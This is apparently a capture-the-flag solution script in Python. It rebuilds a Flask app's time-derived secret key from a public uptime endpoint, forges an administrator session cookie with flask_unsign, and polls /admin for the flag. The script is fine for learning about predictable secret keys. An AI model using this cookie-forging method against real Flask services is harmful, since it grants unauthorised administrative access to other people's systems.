from datetime import datetime, timedelta
import requests
import hashlib
from flask_unsign import sign
import os
import sys

headers = {
    "Host": "chal.competitivecyber.club:9999",
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

vuln_site = 'http://chal.competitivecyber.club:9999'
cookie = {'username': 'administrator', 'is_admin': True}

def status():
	res = requests.get(vuln_site+'/status')
	res = res.content.decode().split('<br>')
	return res[0].split(' ')[-1], ' '.join(res[1].strip().split(' ')[-2:])

def get_secure_key(uptime, current_time):
	server_time = datetime.strptime(current_time, "%Y-%m-%d %H:%M:%S")
	uptime_parts = uptime.split(':')
	uptime = timedelta(hours=int(uptime_parts[0]), minutes=int(uptime_parts[1]), seconds=int(uptime_parts[2]))
	server_start_time = server_time - uptime
	server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
	secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
	return secure_key
	
def forge_cookie(secret_key):
	return sign(cookie, secret=secret_key)

def exploit(signed_cookie):
	cookies = {"session": signed_cookie}
	response = requests.get(vuln_site+'/admin', headers=headers, cookies=cookies)
	return response.content.decode()

	

if __name__ == '__main__':
	t=0
	while True:
		uptime, current_time = status()
		secret_key = get_secure_key(uptime, current_time)
		signed_cookie = forge_cookie(secret_key)	
		flag = exploit(signed_cookie)
		if flag.startswith('PCTF{'):
			print(f'\rFlag: {flag}')
			break
		t+=1
		sep = '.'*t
		sys.stdout.write(f"\rLoading {sep}")
		sys.stdout.flush()
		



